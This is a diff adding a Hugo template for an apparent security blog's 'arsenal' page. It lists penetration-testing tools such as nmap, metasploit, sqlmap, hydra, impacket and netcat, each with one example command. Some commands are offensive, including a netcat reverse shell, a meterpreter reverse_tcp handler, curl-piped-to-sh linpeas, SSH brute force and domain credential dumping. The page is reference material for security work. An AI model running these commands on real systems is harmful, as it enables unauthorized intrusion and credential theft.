@@ -1,0 +1,221 @@
+{{ define "main" }}
+
+<header class="page-header">
+  {{- partial "breadcrumbs.html" . }}
+  <h1>{{ .Title }}</h1>
+  {{- if .Description }}
+  <div class="post-description">{{ .Description }}</div>
+  {{- end }}
+</header>
+
+<div class="arsenal-page">
+  <div class="arsenal-terminal-header">
+    <span class="prompt">$</span> ls -la /opt/tools/ --group-by-category
+  </div>
+
+  <div class="filter-bar" id="arsenal-filter-bar">
+    <div class="filter-row">
+      <span class="filter-label">Category:</span>
+      <button class="filter-btn active" data-filter="category" data-value="all">All</button>
+      <button class="filter-btn" data-filter="category" data-value="recon">Recon</button>
+      <button class="filter-btn" data-filter="category" data-value="exploit">Exploitation</button>
+      <button class="filter-btn" data-filter="category" data-value="privesc">Priv Esc</button>
+      <button class="filter-btn" data-filter="category" data-value="passwords">Passwords</button>
+      <button class="filter-btn" data-filter="category" data-value="web">Web Testing</button>
+      <button class="filter-btn" data-filter="category" data-value="networking">Networking</button>
+    </div>
+  </div>
+
+  <div class="arsenal-grid" id="arsenal-grid">
+
+    {{- /* ---- Reconnaissance ---- */ -}}
+    <div class="tool-card" data-category="recon">
+      <div class="tool-header">
+        <h3 class="tool-name">nmap</h3>
+        <span class="tool-category-badge recon">Recon</span>
+      </div>
+      <p class="tool-desc">Network exploration and security auditing. The gold standard for port scanning and service enumeration.</p>
+      <div class="tool-usage"><code>nmap -sC -sV -oN scan.txt 10.10.10.1</code></div>
+      <a class="tool-link" href="https://nmap.org/" target="_blank" rel="noopener">nmap.org &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="recon">
+      <div class="tool-header">
+        <h3 class="tool-name">gobuster</h3>
+        <span class="tool-category-badge recon">Recon</span>
+      </div>
+      <p class="tool-desc">Directory and DNS brute-forcing tool written in Go. Fast and flexible for content discovery.</p>
+      <div class="tool-usage"><code>gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></div>
+      <a class="tool-link" href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">github.com/OJ/gobuster &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="recon">
+      <div class="tool-header">
+        <h3 class="tool-name">ffuf</h3>
+        <span class="tool-category-badge recon">Recon</span>
+      </div>
+      <p class="tool-desc">Fast web fuzzer written in Go. Supports directory discovery, virtual host enumeration, and parameter fuzzing.</p>
+      <div class="tool-usage"><code>ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301</code></div>
+      <a class="tool-link" href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">github.com/ffuf/ffuf &rarr;</a>
+    </div>
+
+    {{- /* ---- Exploitation ---- */ -}}
+    <div class="tool-card" data-category="exploit">
+      <div class="tool-header">
+        <h3 class="tool-name">metasploit</h3>
+        <span class="tool-category-badge exploit">Exploitation</span>
+      </div>
+      <p class="tool-desc">The world's most used penetration testing framework. Exploit development, payload generation, and post-exploitation.</p>
+      <div class="tool-usage"><code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST tun0; run"</code></div>
+      <a class="tool-link" href="https://www.metasploit.com/" target="_blank" rel="noopener">metasploit.com &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="exploit">
+      <div class="tool-header">
+        <h3 class="tool-name">sqlmap</h3>
+        <span class="tool-category-badge exploit">Exploitation</span>
+      </div>
+      <p class="tool-desc">Automatic SQL injection and database takeover tool. Supports detection and exploitation of SQL injection flaws.</p>
+      <div class="tool-usage"><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></div>
+      <a class="tool-link" href="https://sqlmap.org/" target="_blank" rel="noopener">sqlmap.org &rarr;</a>
+    </div>
+
+    {{- /* ---- Privilege Escalation ---- */ -}}
+    <div class="tool-card" data-category="privesc">
+      <div class="tool-header">
+        <h3 class="tool-name">linpeas</h3>
+        <span class="tool-category-badge privesc">Priv Esc</span>
+      </div>
+      <p class="tool-desc">Linux Privilege Escalation Awesome Script. Enumerates system info, credentials, and escalation vectors.</p>
+      <div class="tool-usage"><code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></div>
+      <a class="tool-link" href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener">github.com/peass-ng/PEASS-ng &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="privesc">
+      <div class="tool-header">
+        <h3 class="tool-name">winpeas</h3>
+        <span class="tool-category-badge privesc">Priv Esc</span>
+      </div>
+      <p class="tool-desc">Windows Privilege Escalation Awesome Script. Comprehensive Windows enumeration for privilege escalation paths.</p>
+      <div class="tool-usage"><code>.\winPEASx64.exe quiet servicesinfo applicationsinfo</code></div>
+      <a class="tool-link" href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener">github.com/peass-ng/PEASS-ng &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="privesc">
+      <div class="tool-header">
+        <h3 class="tool-name">bloodhound</h3>
+        <span class="tool-category-badge privesc">Priv Esc</span>
+      </div>
+      <p class="tool-desc">Active Directory attack path mapping. Reveals hidden relationships and attack paths in AD environments.</p>
+      <div class="tool-usage"><code>bloodhound-python -u user -p pass -d domain.local -c all -ns 10.10.10.1</code></div>
+      <a class="tool-link" href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener">github.com/SpecterOps/BloodHound &rarr;</a>
+    </div>
+
+    {{- /* ---- Password Cracking ---- */ -}}
+    <div class="tool-card" data-category="passwords">
+      <div class="tool-header">
+        <h3 class="tool-name">hashcat</h3>
+        <span class="tool-category-badge passwords">Passwords</span>
+      </div>
+      <p class="tool-desc">Advanced GPU-based password recovery. Supports 350+ hash types with rule-based and mask attacks.</p>
+      <div class="tool-usage"><code>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></div>
+      <a class="tool-link" href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat.net &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="passwords">
+      <div class="tool-header">
+        <h3 class="tool-name">john</h3>
+        <span class="tool-category-badge passwords">Passwords</span>
+      </div>
+      <p class="tool-desc">John the Ripper — versatile password cracker. Supports many hash formats and has powerful rule modes.</p>
+      <div class="tool-usage"><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></div>
+      <a class="tool-link" href="https://www.openwall.com/john/" target="_blank" rel="noopener">openwall.com/john &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="passwords">
+      <div class="tool-header">
+        <h3 class="tool-name">hydra</h3>
+        <span class="tool-category-badge passwords">Passwords</span>
+      </div>
+      <p class="tool-desc">Online brute-force login cracker. Supports numerous protocols including SSH, FTP, HTTP, SMB, and more.</p>
+      <div class="tool-usage"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1</code></div>
+      <a class="tool-link" href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">github.com/vanhauser-thc/thc-hydra &rarr;</a>
+    </div>
+
+    {{- /* ---- Web Testing ---- */ -}}
+    <div class="tool-card" data-category="web">
+      <div class="tool-header">
+        <h3 class="tool-name">burpsuite</h3>
+        <span class="tool-category-badge web">Web Testing</span>
+      </div>
+      <p class="tool-desc">Integrated platform for web application security testing. Proxy, scanner, intruder, repeater and more.</p>
+      <div class="tool-usage"><code># Configure browser proxy → 127.0.0.1:8080
+# Intercept, modify, and replay HTTP requests</code></div>
+      <a class="tool-link" href="https://portswigger.net/burp" target="_blank" rel="noopener">portswigger.net/burp &rarr;</a>
+    </div>
+
+    {{- /* ---- Networking ---- */ -}}
+    <div class="tool-card" data-category="networking">
+      <div class="tool-header">
+        <h3 class="tool-name">netcat</h3>
+        <span class="tool-category-badge networking">Networking</span>
+      </div>
+      <p class="tool-desc">The Swiss army knife of networking. TCP/UDP connections, port scanning, file transfer, and reverse shells.</p>
+      <div class="tool-usage"><code>nc -lvnp 4444  # Listener
+nc -e /bin/bash 10.10.14.1 4444  # Reverse shell</code></div>
+      <a class="tool-link" href="https://nmap.org/ncat/" target="_blank" rel="noopener">nmap.org/ncat &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="networking">
+      <div class="tool-header">
+        <h3 class="tool-name">wireshark</h3>
+        <span class="tool-category-badge networking">Networking</span>
+      </div>
+      <p class="tool-desc">Network protocol analyser. Capture and interactively browse traffic with deep inspection of hundreds of protocols.</p>
+      <div class="tool-usage"><code>wireshark -i eth0 -f "port 80"
+tshark -r capture.pcap -Y "http.request"</code></div>
+      <a class="tool-link" href="https://www.wireshark.org/" target="_blank" rel="noopener">wireshark.org &rarr;</a>
+    </div>
+
+    <div class="tool-card" data-category="networking">
+      <div class="tool-header">
+        <h3 class="tool-name">impacket</h3>
+        <span class="tool-category-badge networking">Networking</span>
+      </div>
+      <p class="tool-desc">Collection of Python classes for working with network protocols. Essential for Windows/AD exploitation and enumeration.</p>
+      <div class="tool-usage"><code>impacket-psexec domain/user:password@10.10.10.1
+impacket-secretsdump -just-dc domain/user@10.10.10.1</code></div>
+      <a class="tool-link" href="https://github.com/fortra/impacket" target="_blank" rel="noopener">github.com/fortra/impacket &rarr;</a>
+    </div>
+
+  </div>
+</div>
+
+<script>
+(function() {
+  var filterBar = document.getElementById('arsenal-filter-bar');
+  var cards = document.querySelectorAll('.tool-card');
+  if (!filterBar || !cards.length) return;
+
+  filterBar.addEventListener('click', function(e) {
+    var btn = e.target.closest('.filter-btn');
+    if (!btn) return;
+
+    var value = btn.getAttribute('data-value');
+
+    filterBar.querySelectorAll('.filter-btn').forEach(function(b) {
+      b.classList.remove('active');
+    });
+    btn.classList.add('active');
+
+    cards.forEach(function(card) {
+      if (value === 'all' || card.getAttribute('data-category') === value) {
+        card.style.display = '';
+      } else {
+        card.style.display = 'none';
+      }
+    });
+  });
+})();
+</script>
+{{ end }}
